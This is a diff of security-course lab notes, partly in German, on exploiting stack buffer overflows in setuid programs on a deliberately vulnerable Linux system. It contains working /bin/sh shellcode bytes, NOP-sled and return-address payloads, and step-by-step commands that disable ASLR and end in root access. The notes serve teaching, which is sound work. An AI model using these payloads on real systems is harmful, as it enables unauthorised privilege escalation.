@@ -1,49 +1,110 @@
 
-chown root.users program
-chmod +s program
-perl -e 'print "\x31\xc0\xb0\x46\31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";' > shellcode2
+#######################
+# SeSysEng lab1c app0 #
+#######################
 
-vim vuln3
+Schwachstelle 2:
+================
+* Buffer Overflow
 
-echo 0 > /proc/sys/kernel/randomize_va_space
-su norights
-whoami
-export SHC=`perl -e 'print "\x90"x125;'``cat shellcode2`
-./getenvaddr SHC
-# plus 4,8,16 to the last byte
-# remember to write it from the last byte to the first 
-# but do not swap the digits of one byte
-./vuln3 `perl -e 'print "\x7a\xfe\xff\xbf"x15;'`
-whoami
+Abstract:
+=========
+  vuln1.c and vuln2.c are two classical stack based bufferoverflow examples. 
+  These code-snippets and exploits are largely inspired by [1]
+  The examples are local bufferoverflows that can be exploited by a unprivilaged user,
+  to gain root access through a vulnerable suid programm (vuln1.c, vuln2.c)
 
+Requirements:
+=============
+* 32bit system
+* Kernel ohne non-executable stack (NX bit)
+  bzw. execstack nachtraeglich aktiviert entweder mit "execstack"
+  oder durch gcc option "-z execstack"
+* Abschalten von ASLR (address space layout randomization)
+  $ echo 0 > /proc/sys/kernel/randomize_va_space
+* Kompiliert ohne stack cookies aka. stack protection (und eventuell mit debugging infos)	
+  $ gcc vuln.c -o vuln -ggdb -fno-stack-protector -z execstack
+* suid bit fuer die vulnerable application
+  $ chown root.users program
+  $ chmod +s program
 
-Debug:
-----------------------------------------------------------------
-gdb vuln3
-run `perl -e 'print "\x7a\xfe\xff\xbf"x15;'
+Testsystem:
+=============
+* Tested on DVL (Damn Vulnerable Linux) Infectious Disease
+  "Linux bt 2.6.20-BT-PwnSauce-NOSMP #3"
+* $ gcc -v
+Reading specs from /usr/lib/gcc/i486-slackware-linux/3.4.6/specs
+Configured with: ../gcc-3.4.6/configure --prefix=/usr --enable-shared --enable-threads=posix --enable-__cxa_atexit --disable-checking --with-gnu-ld --verbose --target=i486-slackware-linux --host=i486-slackware-linux
+Thread model: posix
+gcc version 3.4.6 
+ 
+Auflistung der Schritte:
+========================
+	Variante 1: Stack based bufferoverflow
+	-----------
+	* echo 0 > /proc/sys/kernel/randomize_va_space
+	* gcc vuln1.c -o vuln1 -z execstack
+	  # or explicitly disable "stack-protector" aka. stack cookies 
+	  # and/or make stack explicitly executable and so disable non-executable stack:
+	  # gcc vuln1.c -o vuln1 -ggdb -fno-stack-protector -z execstack	   
+	* chown root.users vuln1
+	* chmod +s vuln1
+	* gcc exploiter.c -o exploiter
+	* su unpriv
+	* whoami
+	* ./exploiter 4 # or other offset value
+	* whoami
+	=> ROOT
 
-gdb vuln3
-break main
-catch exec
-run `perl -e 'print "\x7a\xfe\xff\xbf"x15;'
-x/50x $edi-50
-x/20i
-x/20s
+	Variante 2: Stack based bufferoverflow using the environment 
+	----------- 
+	* echo 0 > /proc/sys/kernel/randomize_va_space
+        * gcc vuln2.c -o vuln2 -z execstack
+          # or explicitly disable "stack-protector" aka. stack cookies
+          # and/or make stack explicitly executable and so disable non-executable stack:
+          # gcc vuln2.c -o vuln2 -ggdb -fno-stack-protector -z execstack
+        * chown root.users vuln2
+        * chmod +s vuln2 
+	* perl -e 'print "\x31\xc0\xb0\x46\31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";' > shellcode
+	* gcc getenvaddr.c -o getenvaddr
+	* su unpriv
+	* whoami
+	* export SHC=`perl -e 'print "\x90"x125;'``cat shellcode`
+	* ./getenvaddr SHC
+	  # Shows address of the environment variable which stores the shellcode
+	  # Use this address to overwrite the EIP (maybe tweek the value to the last byte a little +-)
+	  # remember to write it from the last byte to the first
+	  # but do not swap the digits of one byte
+	  # SHC is located at 0xbffffe85 => 
+	* ./vuln2 `perl -e 'print "\x85\xfe\xff\xbf"x15;'`
+	* whoami
+	==> ROOT
 
+	Variante 3: Return to libc
+	-----------
+	* 
 
-Variante2:
----------------------------------------------------------------
-vim vuln2
-vim exploit2.c
+Beschreibung:
+=============
+	Variante 1: Stack based bufferoverflow
+        -----------
+	Das ist ein klassisches Bufferoverflow beispiel, der shellcode wird nach einer NOP sled auf den stack "gepusht", gefolgt von
+	einer flut an return addressen. Damit soll sichergestellt sein, dass die return-addresse welche auf den stack gepusht wurde durch
+	eine neue return addresse ueberschrieben wird die in die NOP sled zeigt.
+	Dabei muss darauf geachtet werden das eines der vielen 4byte words der neuen return addresse genau die 4byte return addresse ueberschreiben,
+	und nicht um ein paar byte verschoben sind.
 
-echo 0 > /proc/sys/kernel/randomize_va_space
-su norights
-whoami
-./exploint3
+        Variante 2: Stack based bufferoverflow using the environment
+        -----------
+        In diesem beispiel ist der Buffer der Applikation nicht gross genug um den shellcode unter zu bringen.
+	Aus diesem grund wird eine environment variable benutzt um den shellcode zu speichern. Die addresse der environment 
+	variable wird ueber ein kleines helper programm ausgelesen (getenvaddr.c)
 
-gdb ./exploiter
+        Variante 3: Return to libc
+        -----------
+        *
+ 
+Referenzen:
+============
+[1] Jon Erickson, Hacking - The art of explitation, ISBN 1-59327-007-0, 2003017498
 
-
---------------------------------------------------------------
-
- delete the property files in <tomcat_root>/webapps/WebGoat/users/*.props
